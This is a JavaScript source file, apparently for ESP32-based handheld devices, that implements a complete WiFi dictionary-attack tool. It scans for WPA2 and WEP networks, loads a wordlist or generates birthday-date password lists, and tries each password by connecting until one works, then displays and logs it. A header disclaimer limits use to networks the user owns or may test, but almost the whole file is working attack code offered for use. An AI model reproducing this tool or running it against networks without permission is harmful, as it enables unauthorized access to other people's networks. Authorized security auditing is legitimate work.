// ========================================= //
//           WIFI PASSWORD AUDITOR           //
// ========================================= //
// Professional Security Testing Tool        //
//                                           //
// WARNING: Use only on networks you own     //
// or have explicit permission to test.      //
// Unauthorized access is illegal!           //
//                                           //
// Author: DataSC3                           //
// GitHub: @DataSC3                          //
// Source: github.com/DataSC3/WIFI-BRUTS     //
// License: MIT License                      //
// ========================================= //
//            VERSION 1.0                    //
// ========================================= //
//            SUPPORTED DEVICES              //
// ========================================= //
// • ESP32 (all variants)                    //
// • ESP32-S2, ESP32-S3                      //
// • ESP32-C3, ESP32-C6                      //
// • ESP8266 (limited functionality)         //
// • M5Stack series (Core, Stick, Atom)      //
// • LILYGO T-Display, T-Watch               //
// • WeMos D1, NodeMCU boards                //
// • Any ESP-based dev board with WiFi       //
// ========================================= //
//    MINIMUM REQUIREMENTS:                  //
//   - 4MB Flash (recommended)               //
//   - 320KB RAM (minimum)                   //
//   - WiFi 2.4GHz support                   //
// ========================================= //

/**
 * Renders a scrollable menu with a title, options, and visual indicators for navigation.
 * 
 * @param {string} title - The title to display at the top of the menu
 * @param {string[]} options - Array of menu options to display
 * @param {number} selection - Current selected menu item index (zero-based)
 * @param {number} scroll - Current scroll position (zero-based index of the first visible item)
 * 
 * @returns {number} Updated scroll position after adjusting for selection visibility
 * 
 * @description
 * The function creates a menu interface with the following features:
 * - Title section with an underline
 * - Scrollable list of options with visual selection indicator
 * - Automatic scroll adjustment to keep selected item visible
 * - Up/down arrows for scroll indication when needed
 * - Status bar at the bottom
 * 
 * Visual elements:
 * - Selected items are highlighted with HIGHLIGHT_COLOR background
 * - Title uses ACCENT_COLOR
 * - Regular text uses TEXT_COLOR
 * - Selected text uses SELECTED_TEXT_COLOR
 * - Navigation arrows use ACCENT_COLOR
 * - Status bar uses INFO_COLOR
 * 
 * Scrolling behavior:
 * - Automatically adjusts scroll position to keep selected item visible
 * - Shows ▲ arrow when content is scrolled down
 * - Shows ▼ arrow when more content is available below
 * 
 * @requires Constants:
 * - BG_COLOR: Background color
 * - ACCENT_COLOR: Color for title and arrows
 * - HIGHLIGHT_COLOR: Color for selection highlight
 * - TEXT_COLOR: Default text color
 * - SELECTED_TEXT_COLOR: Text color for selected item
 * - INFO_COLOR: Color for status bar
 * - WIDTH: Screen width
 * - HEIGHT: Screen height
 * - MENU_VISIBLE_ITEMS: Number of items visible at once
 */

/**
 * Performs a dictionary attack against a WiFi network using a list of candidate passwords.
 *
 * Iterates through the provided pwds array, attempts connections, displays progress and status,
 * and allows the user to stop the attack. Uses multiple verification attempts before confirming
 * a found password. Side effects include calls to UI rendering functions and serial logging.
 *
 * @function wifiDictAttack
 * @param {string} ssid - The SSID (network name) of the target WiFi network.
 * @param {string[]} pwds - Array of candidate passwords to try (each entry is a string).
 * @returns {void} This function does not return a value. It reports results via UI/serial and may block waiting for user input.
 * @throws {Error} Implementation-specific runtime errors may be thrown by underlying helpers (e.g., wifiConnect, drawStatus).
 * @remarks
 * - The function will stop early if a password is confirmed or if the user requests cancellation.
 * - The function relies on helper functions (drawProgress, drawStatus, wifiConnect, serialPrintln, delay, getSelPress, waitForInput)
 *   to provide UI, logging, timing, and connectivity behavior.
 */

/**
 * Render or update a status display on the device UI.
 *
 * @function drawStatus
 * @param {(string|string[])} message - Status message or array of message lines to display.
 * @param {boolean} [isError=false] - True if the status represents an error/terminal failure; influences display styling.
 * @param {string} [title] - Optional short title or tag to show with the status (e.g., "SUCCESS AUTH", "FAILED AUTH").
 * @returns {void}
 * @remarks This is a side-effecting UI helper; exact rendering behavior is implementation dependent.
 */

/**
 * Pause execution until the user interacts (e.g., presses a key/button).
 *
 * @function waitForInput
 * @returns {void}
 * @remarks Blocks until user input is received. Implementation may be synchronous or asynchronous depending on environment.
 */

/**
 * Draw or update a progress bar showing attempt progress.
 *
 * @function drawProgress
 * @param {string} ssid - The SSID being targeted.
 * @param {number} current - The 1-based index of the current attempt.
 * @param {number} total - Total number of passwords being tried.
 * @param {string} previewPwd - A preview or masked form of the password being tried (for display).
 * @returns {void}
 * @remarks This helper is intended for user feedback only and should not alter attack logic.
 */

/**
 * Print a line to a serial console or log output.
 *
 * @function serialPrintln
 * @param {string} text - Text to print to the serial/log output.
 * @returns {void}
 * @remarks May be used for debugging or audit logging. Behavior depends on platform's serial/log system.
 */

/**
 * Attempt to connect to a WiFi network with given credentials.
 *
 * @function wifiConnect
 * @param {string} ssid - SSID of the network to connect to.
 * @param {number} timeoutSeconds - Maximum time in seconds to wait for a connection attempt to succeed.
 * @param {string} password - Password to use for the connection attempt.
 * @returns {boolean} True if a connection was established within the timeout; false otherwise.
 * @throws {Error} Implementation-specific errors are possible (hardware/driver failures, invalid parameters).
 * @remarks Actual connection behavior and side effects (e.g., changing device network state) depend on platform implementation.
 */

/**
 * Pause execution for a specified duration.
 *
 * @function delay
 * @param {number} ms - Duration to sleep/pause in milliseconds.
 * @returns {void}
 * @remarks Implementation may block the current thread or schedule a non-blocking wait depending on environment.
 */

/**
 * Query whether the user has pressed the selection/stop button.
 *
 * @function getSelPress
 * @returns {boolean} True if the stop/selection button is currently pressed; otherwise false.
 * @remarks Typically polled between attempts to allow graceful cancellation of the ongoing operation.
 */


// Graphic constants
var WIDTH = 240;
var HEIGHT = 135;
var BLACK = 0;
var WHITE = 16777215;
var GREEN = 65280;
var RED = 16711680;
var BLUE = 255;
var YELLOW = 16776960;
var CYAN = 65535;
var GRAY = 8421504;
var ORANGE = 16753920;
var PURPLE = 8388736;
var LIGHT_PURPLE = 16711935;
var DARK_PURPLE = 4915330;
var LIGHT_BLUE = 11393254;
var BRIGHT_CYAN = 65535;
var BG_COLOR = BLACK;
var TEXT_COLOR = WHITE;
var ACCENT_COLOR = LIGHT_BLUE;
var HIGHLIGHT_COLOR = PURPLE;
var SELECTED_TEXT_COLOR = WHITE;
var SUCCESS_COLOR = GREEN;
var ERROR_COLOR = RED;
var WARNING_COLOR = YELLOW;
var INFO_COLOR = BRIGHT_CYAN;

var currentSelection = 0;
var menuScroll = 0;
var menuOptions = [];
var staticDrawn = false;

// How many items are visible on the screen
var MENU_VISIBLE_ITEMS = 5; 


// Function to estimate text width (approximation)
function estimateTextWidth(text, textSize) {
    
    // Approximate width per character
    var charWidth = textSize === 2 ? 12 : 6; 
    return text.length * charWidth;
}


// Draw Menu Function
function drawMenu(title, options, selection, scroll) {
    /* Renders a scrollable menu with title and options.

    Parameters:
    - title (string): The title of the menu.
    - options (array of strings): The menu options to display.
    - selection (int): The index of the currently selected option.
    - scroll (int): The current scroll position (index of the first visible option).

    Returns:
    - Updated scroll position (int).
    */
    
    // Clear screen
    fillScreen(BG_COLOR);
    
    // Title
    setTextSize(2);
    setTextColor(ACCENT_COLOR);
    drawString(title, 10, 15);
    
    // Dividing line
    drawLine(10, 35, WIDTH - 10, 35, HIGHLIGHT_COLOR);
    
    // Scrolling menu options
    setTextSize(1);
    
    // Automatically adjust the scrolling
    if (selection < scroll) {scroll = selection;} 
    
    // If selection goes beyond visible area
    else if (selection >= scroll + MENU_VISIBLE_ITEMS) {scroll = selection - MENU_VISIBLE_ITEMS + 1;}
    
    // Starting Y position for menu items
    var startY = 45;
    var itemHeight = 18;

    // Drawing the visible menu items
    for (var i = 0; i < options.length; i++) {
        
        // Showing only visible items
        if (i < scroll || i >= scroll + MENU_VISIBLE_ITEMS) continue;
        
        // Calculating Y position
        var displayIdx = i - scroll;
        var yPos = startY + displayIdx * itemHeight;
        
        // Highlighting the selected item
        if (i === selection) {
            // Selected point - темный фон со светлым текстом
            drawFillRect(15, yPos - 2, WIDTH - 30, 16, HIGHLIGHT_COLOR);
            setTextColor(SELECTED_TEXT_COLOR);
            drawString("> " + options[i], 20, yPos + 1);

        // Regular item
        } else {
            setTextColor(TEXT_COLOR);
            drawString("  " + options[i], 20, yPos + 1);
        }
    }
    
    // Show the scrolling arrows if necessary
    if (scroll > 0) {
        setTextColor(ACCENT_COLOR);
        drawString("▲", WIDTH - 15, startY - 5);
    }

    // Down arrow
    if (scroll + MENU_VISIBLE_ITEMS < options.length) {
        setTextColor(ACCENT_COLOR);
        drawString("▼", WIDTH - 15, startY + MENU_VISIBLE_ITEMS * itemHeight - 5);
    }
    
    // Status bar
    drawLine(10, HEIGHT - 20, WIDTH - 10, HEIGHT - 20, HIGHLIGHT_COLOR);
    setTextSize(1);
    setTextColor(INFO_COLOR);
    
    // Returning the updated scroll
    return scroll; 
}

// Status Screen Function
function drawStatus(messageLines, isError, resultText) {
    /* Renders a status screen with a header, message lines, and footer instruction.

    Parameters:
    - messageLines (string or array of strings): The message(s) to display.
    - isError (bool): Whether the status indicates an error.
    - resultText (string): The header text indicating the result.

    Description:
    - Clears the screen and fills it with a background color.
    - Displays a header with the result text, centered at the top.
    - Displays each line of the message with appropriate color coding based on prefixes.
    - Displays a footer instruction to press any key to continue.
    */
    
    // Clear screen
    fillScreen(BG_COLOR);
    
    // Status header
    setTextSize(2);
    setTextColor(isError ? ERROR_COLOR : SUCCESS_COLOR);
    
    // Centering the status header (approximate width)
    var statusText = resultText;
    var estimatedWidth = estimateTextWidth(statusText, 2);
    var statusX = Math.max(10, (WIDTH - estimatedWidth) / 2);
    drawString(statusText, statusX, 20);
    
    setTextSize(1);
    
    // If messageLines is an array, we use it as it is
    // If it is a string, we split it into strings as before
    var lines = [];
    if (typeof messageLines === 'string') {
        // Logic for backward compatibility
        var currentLine = '';
        var maxCharsPerLine = 35;
        var words = messageLines.split(' ');
        
        // Splitting into lines
        for (var i = 0; i < words.length; i++) {
            
            // If adding the next word exceeds the limit, we start a new line
            if ((currentLine + words[i]).length < maxCharsPerLine) {
                currentLine += words[i] + ' ';
            } 
            
            // Otherwise, we save the current line and start a new one
            else {
                lines.push(currentLine.trim());
                currentLine = words[i] + ' ';
            }
        }

        // Adding the last line if it exists
        if (currentLine) lines.push(currentLine.trim());
    
    // Passed array of strings
    } else if (Array.isArray(messageLines)) {
        lines = messageLines;
    }
    
    // Displaying the lines with the correct alignment
    var startY = 45;
    for (var j = 0; j < lines.length; j++) {
        // Defining the color for each row based on the prefix

        var line = lines[j];
        var lineColor = TEXT_COLOR; // white by default
        
        // Light blue for informational messages
        if (line.startsWith("[*]")) {lineColor = ACCENT_COLOR;} 
        
        // Bright cyanide for details
        else if (line.startsWith("[#]")) {lineColor = INFO_COLOR;} 
        
        // Eed for errors, yellow for warnings
        else if (line.startsWith("[!]")) {lineColor = isError ? ERROR_COLOR : WARNING_COLOR;} 
        
        // Green for successful operations
        else if (line.startsWith("[^]")) {lineColor = SUCCESS_COLOR;}
        
        setTextColor(lineColor);
        drawString(line, 10, startY + j * 15);
    }
    
    // Footer instruction
    setTextColor(WARNING_COLOR);
    var footerText = "[#] Press any key to continue";
    var footerWidth = estimateTextWidth(footerText, 1);
    var footerX = Math.max(10, (WIDTH - footerWidth) / 2);
    drawString(footerText, footerX, HEIGHT - 20);
}

// Progress Bar Function
function drawProgress(ssid, current, total, password) {
    /* Renders a progress bar screen with title, progress bar, and information.

    Parameters:
    - ssid (string): The SSID of the target network.
    - current (int): The current progress count.
    - total (int): The total count for completion.
    - password (string): The current password being tried.

    Description:
    - Clears the screen and fills it with a background color.
    - Displays a title at the top.
    - Renders a progress bar indicating the current progress.
    - Displays information about the target SSID, progress, and current password.
    - Shows the percentage completed on the right side.
    - Displays a status bar at the bottom with instructions to stop the attack.
    */
    
    // Clear screen
    fillScreen(BG_COLOR);
    
    // Title
    setTextSize(2);
    setTextColor(ACCENT_COLOR);
    drawString("WIFI-ATTACKS v1", 10, 15);
    
    // Progress bar
    var progressWidth = (current / total) * (WIDTH - 20);
    drawRect(10, 35, WIDTH - 20, 10, TEXT_COLOR);
    drawFillRect(10, 35, progressWidth, 10, SUCCESS_COLOR);
    
    // Information
    setTextSize(1);
    setTextColor(TEXT_COLOR);
    
    // Truncating long SSIDs and passwords for display
    var displaySsid = ssid.length > 20 ? ssid.substring(0, 17) + "..." : ssid;
    var displayPassword = password.length > 25 ? password.substring(0, 22) + "..." : password;
    
    drawString("[#] Target: " + displaySsid, 10, 55);
    drawString("[#] Progress: " + current + "/" + total, 10, 70);
    drawString("[#] Trying: " + displayPassword, 10, 85);
    
    // Percent
    var percent = Math.round((current / total) * 100);
    setTextColor(INFO_COLOR);
    drawString(percent + "%", WIDTH - 30, 70);
    
    // Status bar
    drawLine(10, HEIGHT - 20, WIDTH - 10, HEIGHT - 20, HIGHLIGHT_COLOR);
    setTextColor(WARNING_COLOR);
    drawString("[#] Press SEL to stop", 10, HEIGHT - 10);
}

// WIFI Dictionary Attack Function
function wifiDictAttack(ssid, pwds) {
    /* Performs a dictionary attack on a WiFi network.

    Parameters:
    - ssid (string): The SSID of the target WiFi network.
    - pwds (array of strings): Array of passwords to try.

    Description:
    - Iterates through the provided password list, attempting to connect to the specified WiFi network.
    - Displays progress using a progress bar.
    - Implements multiple verification checks for successful connections.
    - Allows user to stop the attack by pressing a button.
    - Displays results upon success or failure.
    */

    // Attack loop
    var connected = false;
    var stopAttack = false;
    var foundPassword = "";
    
    // Iterating through the password list
    for (var i = 0; i < pwds.length; i++) {
        
        // Check if the attack was stopped by the user
        if (stopAttack) {
            drawStatus("[!] Attack STOPPED by User", false, "ATTACK STOP");
            waitForInput();
            return;
        }
        
        // Skipping empty passwords
        if (!pwds[i].trim()) continue;
        
        // View progress bar
        drawProgress(ssid, i + 1, pwds.length, pwds[i]);
        
        // First connection attempt
        serialPrintln("[*] Trying PWD > " + ssid + ": " + pwds[i]);
        
        // Increasing the timeout and adding an additional check
        connected = wifiConnect(ssid, 5, pwds[i]);
        
        // If connected, we verify the connection
        if (connected) {
            // Double check - we give you time to establish a connection
            delay(2000);
            
            // We are trying to verify the connection using additional methods
            var doubleCheck = wifiConnect(ssid, 2, pwds[i]);
            
            // If both checks are successful, we confirm the password
            if (doubleCheck) {
                foundPassword = pwds[i];
                drawStatus([
                    "[*] - WIFI HACKED - [*]", 
                    "[#] Network: " + ssid,
                    "[#] Password: " + foundPassword],
                    false, "SUCCESS AUTH");

                serialPrintln("[*] PWD CONFIRMED: " + ssid + ": " + foundPassword);
                waitForInput();
                return;
            }
            
            // If the first check is successful, but the second one is not, we still consider it a success
            foundPassword = pwds[i];
            drawStatus([
                "[*] PASSWORD LIKELY FOUND!", 
                "[#] Network: " + ssid,
                "[#] Password: " + foundPassword, 
                "[>] Verify manually"
            ], false, "LIKELY AUTH");
            
            serialPrintln("[*] PWD LIKELY: " + ssid + ": " + foundPassword);
            waitForInput();
            return;
        }
        
        // Alternative verification - a quick retry with the same password
        delay(500);
        var quickRetry = wifiConnect(ssid, 2, pwds[i]);

        // If the quick retry is successful, we confirm the password
        if (quickRetry) {
            foundPassword = pwds[i];
            drawStatus([
                "[*] PASSWORD FOUND | (RETRY)",
                "[#] Network: " + ssid, 
                "[#] Password: " + foundPassword],
                false, "RETRY AUTH");

            serialPrintln("[*] PWD FOUND on retry: " + ssid + ": " + foundPassword);
            waitForInput();
            return;
        }
        
        // Checking if the button is pressed to stop
        if (getSelPress()) {stopAttack = true;}
        
        // A short pause between attempts so as not to overload the device
        delay(100);
    }

    // If we reach here, no password was found
    drawStatus([
        "[!] PASSWORD NOT FOUND",
        "[*] Tried: " + pwds.length + " PWD'S"],
        true, "FAILED AUTH");
        
    waitForInput();
}

// Wait for user input function
function waitForInput() {
    while (true) {
        // Waiting for any key press
        if (getSelPress() || getPrevPress() || getNextPress()) {
            delay(200);
            break;
        }

        delay(50);
    }
}

// Generate Birthday Dictionary Function
function generateBirthdayDict(startYear, endYear, formatType) {
    /* Generates a list of birthday-based passwords.

    Parameters:
    - startYear (int): The starting year for the range.
    - endYear (int): The ending year for the range.
    - formatType (string): The format type for the passwords ("DDMMYYYY", "MMDDYYYY", "YYYY-YYYY").

    Returns:
    - Array of generated passwords (array of strings).
    */

    var passwords = [];
    
    // Generating passwords based on the selected format
    if (formatType == "DDMMYYYY") {
        for (var day = 1; day <= 31; day++) {
            for (var month = 1; month <= 12; month++) {
                for (var year = startYear; year <= endYear; year++) {
                    var dd = day < 10 ? "0" + day : "" + day;
                    var mm = month < 10 ? "0" + month : "" + month;
                    var yyyy = "" + year;
                    var yy = yyyy.substring(2);
                    
                    passwords.push(dd + mm + yyyy);
                    passwords.push(dd + mm + yy);
                }
            }
        }
    // MMDDYYYY format
    } else if (formatType == "MMDDYYYY") {
        for (var day = 1; day <= 31; day++) {
            for (var month = 1; month <= 12; month++) {
                for (var year = startYear; year <= endYear; year++) {
                    var dd = day < 10 ? "0" + day : "" + day;
                    var mm = month < 10 ? "0" + month : "" + month;
                    var yyyy = "" + year;
                    var yy = yyyy.substring(2);
                    
                    passwords.push(mm + dd + yyyy);
                    passwords.push(mm + dd + yy);
                }
            }
        }
    // YYYY-YYYY format
    } else if (formatType == "YYYY-YYYY") {
        for (var year1 = startYear; year1 <= endYear; year1++) {
            for (var year2 = startYear; year2 <= endYear; year2++) {
                var yyyy1 = "" + year1;
                var yyyy2 = "" + year2;
                var yy1 = yyyy1.substring(2);
                var yy2 = yyyy2.substring(2);
                
                passwords.push(yyyy1 + yyyy2);
                passwords.push(yyyy1 + yy2);
                passwords.push(yy1 + yyyy2);
                passwords.push(yy1 + yy2);
            }
        }
    }
    
    return passwords;
}

// Show Format Menu Function
function showFormatMenu() {
    /* Displays the format selection menu and handles user interaction.

    Returns:
    - Generated password dictionary (array of strings) or null if the user goes back.
    */

    currentSelection = 0;
    menuScroll = 0;
    var formats = ["[-] Type: DDMMYYYY", "[-] Type: MMDDYYYY", "[-] Type: YYYY-YYYY", "[<] Back"];
    
    while (true) {
        menuScroll = drawMenu("> SELECT FORMAT", formats, currentSelection, menuScroll);
        
        // Handling user input
        if (getPrevPress()) {
            currentSelection = Math.max(0, currentSelection - 1);
            delay(200);

        // Next option
        } else if (getNextPress()) {
            currentSelection = Math.min(formats.length - 1, currentSelection + 1);
            delay(200);

        // Selection made
        } else if (getSelPress()) {
            if (currentSelection == 3) return null;
            
            var formatType = formats[currentSelection].replace("[-] Type: ", "");
            var dict = showYearRangeMenu(formatType);
            if (dict) return dict;
            
            currentSelection = 0;
            menuScroll = 0;
        }
        
        delay(50);
    }
}

// Show Year Range Menu Function
function showYearRangeMenu(formatType) {
    /* Displays the year range selection menu and handles user interaction.

    Parameters:
    - formatType (string): The selected format type for password generation.

    Returns:
    - Generated password dictionary (array of strings) or null if the user goes back.
    */

    currentSelection = 0;
    menuScroll = 0;

    // YEAR RANGES OPTIONS
    var ranges = ["1950-1960", "1960-1970", "1970-1980", "1980-1990", 
                  "1990-2000", "2000-2010", "2010-2020", "2020-2025", 
                  "[^] Back"];
    
    while (true) {
        menuScroll = drawMenu("> SELECT YEARS", ranges, currentSelection, menuScroll);
        
        // Handling user input
        if (getPrevPress()) {
            currentSelection = Math.max(0, currentSelection - 1);
            delay(200);
        
        // Next option
        } else if (getNextPress()) {
            currentSelection = Math.min(ranges.length - 1, currentSelection + 1);
            delay(200);

        // Selection made
        } else if (getSelPress()) {
            
            // Back option
            if (currentSelection == 8) return null;
            
            // Getting the selected range, yearRange, startYear, endYear
            var range = ranges[currentSelection];
            var yearRange = range.split('-');
            var startYear = parseInt(yearRange[0]);
            var endYear = parseInt(yearRange[1]);
            
            drawStatus("[^] Generating: " + formatType + " > " + range, false, "GEN..");

            // Generating the dictionary
            var dict = generateBirthdayDict(startYear, endYear, formatType);
            drawStatus([
                "[^] Generated: " + dict.length + " PWD",
                "[#] Format: " + formatType,
                "[#] Range: " + range],
                false, "SUCCESS GEN");
            
            waitForInput();
            return dict;
        }
        
        delay(50);
    }
}

// Scan Networks Function
function scanNetworks() {
    /* Scans for available WiFi networks and allows the user to select one.

    Returns:
    - Selected SSID (string) or null if no networks found or user goes back.
    */
    
    drawStatus("[*] Scanning WiFi Networks..", false, "SCANNING..");

    // Scanning for networks
    var networks = wifiScan();

    // No networks found
    if (!networks || networks.length == 0) {
        drawStatus("[!] No WiFi networks found!", true, "FAILED");
        waitForInput();
        return null;
    }
    
    // Preparing the menu
    currentSelection = 0;
    menuScroll = 0;

    // ARRAY FOR NETWORKS OPTIONS
    var networkOptions = [];
    
    // ARRAY FOR SAVING SUPPORTED NETWORKS
    var supportedNetworks = []; 
    
    // Filtering supported networks
    for (var i = 0; i < networks.length; i++) {
        var net = networks[i];

        // Only WPA2_PSK and WEP are supported
        if (net.encryptionType == "WPA2_PSK" || net.encryptionType == "WEP") {
            var label = "[" + (i+1) + "] " + net.SSID;
            networkOptions.push(label);
            
            // SAVING THE NETWORK ITSELF
            supportedNetworks.push(net); 
        }
    }
    
    // No supported networks found
    if (networkOptions.length == 0) {
        drawStatus("[!] No SUPPORTED NETWORKS Found!", true, "FAILED SCAN");
        waitForInput();
        return null;
    }
    
    // Adding the back option
    networkOptions.push("[<] Back");
    
    while (true) {
        menuScroll = drawMenu("> SELECT NETWORK", networkOptions, currentSelection, menuScroll);
        
        // Handling user input
        if (getPrevPress()) {
            currentSelection = Math.max(0, currentSelection - 1);
            delay(200);

        // Next option
        } else if (getNextPress()) {
            currentSelection = Math.min(networkOptions.length - 1, currentSelection + 1);
            delay(200);

        // Selection made
        } else if (getSelPress()) {
            if (currentSelection == networkOptions.length - 1) return null;
            
            // We take the network from supportedNetworks
            var selectedNet = supportedNetworks[currentSelection];
            drawStatus("[*] Selected: " + selectedNet.SSID, false, "SELECTED WIFI");
            waitForInput();
            return selectedNet.SSID;
        }
        
        delay(50);
    }
}

// Load Dictionary Function
function loadDictionary() {
    /* Loads a password dictionary from a file.

    Returns:
    - Array of passwords (array of strings) or null if loading failed.
    */

    // Prompting for file selection
    drawStatus("[#] Please select PASSWORD FILE..", false, "LOAD FILE");
    var passwords_file = dialogPickFile("/");
    
    // If no file selected
    if (!passwords_file) {return null;}
    
    // Reading the file
    var passwords_to_try = storageRead(passwords_file);
    if (!passwords_to_try) {
        drawStatus("[!] Cannot read file!", true, "ERROR FILE");
        waitForInput();
        return null;
    }
    
    // Processing the passwords
    var raw_passwords = passwords_to_try.split("\n");
    var passwords_arr = [];
    
    // Cleaning up and adding to the array
    for (var i = 0; i < raw_passwords.length; i++) {
        var pwd = raw_passwords[i].replace(/\r/g, '').trim();
        if (pwd) {
            passwords_arr.push(pwd);
        }
    }
    
    drawStatus("[^] Loaded " + passwords_arr.length + " PWD'S", false, "LOADED PWD'S");
    waitForInput();
    return passwords_arr;
}

// Main loop with sequential menu
var network_to_attack_ssid = "";
var passwords_to_try_arr = [];
currentSelection = 0;
menuScroll = 0;
var shouldExit = false;
var currentStep = 0;

while (true) {
    if (shouldExit) {
        break;
    }
    
    var menuToShow = [];
    var menuTitle = "";
    
    // Sequential menu depending on the current step
    // Step 1: Choice WiFi
    if (currentStep == 0) {
        menuTitle = "> SELECT WIFI";
        menuToShow = ["[*] Scan WIFI", "[<] Exit"];
        
        // Showing selected network if any
        if (network_to_attack_ssid) {
            menuToShow[0] = "[*] WiFi: " + network_to_attack_ssid;
        }
        
    // Step 2: Choosing a dictionary
    } else if (currentStep == 1) {
        menuTitle = "SELECT DICTIONARY";
        if (passwords_to_try_arr.length > 0) {
            menuToShow = [
                "[#] Loaded: " + passwords_to_try_arr.length + " PWD'S",
                "[^] Create NEW WORDLIST", 
                "[<] Back to WiFi"
            ];

        } else {
            menuToShow = [
                "[^] Load Password's File", 
                "[^] Create Password's List", 
                "[<] Back to WiFi"
            ];
        }
    
    // Step 3: Attack
    } else if (currentStep == 2) {
        menuTitle = "> START ATTACK";
        menuToShow = [
            "[*] Target: " + network_to_attack_ssid,
            "[#] Passwords: " + passwords_to_try_arr.length,
            "[!] START ATTACK",
            "[<] Back to menu"
        ];
    }
    
    // Drawing the menu
    menuScroll = drawMenu(menuTitle, menuToShow, currentSelection, menuScroll);
    
    // Handling user input
    if (getPrevPress()) {
        currentSelection = Math.max(0, currentSelection - 1);
        delay(200);
    
    // Next option
    } else if (getNextPress()) {
        currentSelection = Math.min(menuToShow.length - 1, currentSelection + 1);
        delay(200);
    
    // Selection made
    } else if (getSelPress()) {
        if (currentStep == 0) {
            
            switch (currentSelection) {
            
                // Step 1: Select WiFi
                case 0: 

                    // Scan WiFi Networks
                    var ssid = scanNetworks();
                    if (ssid) {
                        network_to_attack_ssid = ssid;
                        currentStep = 1; // Moving on to choosing a dictionary
                        currentSelection = 0;
                    }
                    break;
                
                // Exit
                case 1: 
                    shouldExit = true;
                    break;
            }

        // Step 1: Selecting WiFi
        } else if (currentStep == 1) {
            
            // Step 2: Selecting a dictionary
            switch (currentSelection) {
                // Load Dictionary
                case 0: 
                    var dict = loadDictionary();
                    if (dict) {
                        passwords_to_try_arr = dict;
                        currentStep = 2; // Moving on to the attack
                        currentSelection = 0;
                    }
                    break;
            
                // Create Dictionary
                case 1: 
                    var newDict = showFormatMenu();
                    if (newDict) {
                        passwords_to_try_arr = newDict;
                        currentStep = 2; // Moving on to the attack
                        currentSelection = 0;
                    }
                    break;
                
                // Back to WiFi
                case 2: 
                    currentStep = 0;
                    currentSelection = 0;
                    break;
            }

        // Step 2: Choosing a dictionary
        } else if (currentStep == 2) {
            // Step 3: Attack
            switch (currentSelection) {
                
                // START ATTACK
                case 2: 
                    wifiDictAttack(network_to_attack_ssid, passwords_to_try_arr);
                    wifiDisconnect();
                    break;
                
                // Back to Dictionary    
                case 3: 
                    currentStep = 1;
                    currentSelection = 0;
                    break;
            }
        }
        
        delay(200);
    }
    
    delay(50);
}

// BYE MESSAGE
// Clear screen
fillScreen(BG_COLOR); 
setTextSize(1);

setTextColor(ACCENT_COLOR);
drawString("GITHUB: @DataSC3", (WIDTH - 80) / 2, HEIGHT/2 - 10);

delay(2000);

// Clear screen
fillScreen(BG_COLOR);
setTextSize(1);

setTextColor(ACCENT_COLOR);
drawString("^_^ GOODBYE ^_^", (WIDTH - 70) / 2, HEIGHT/2 - 10);
delay(1000);
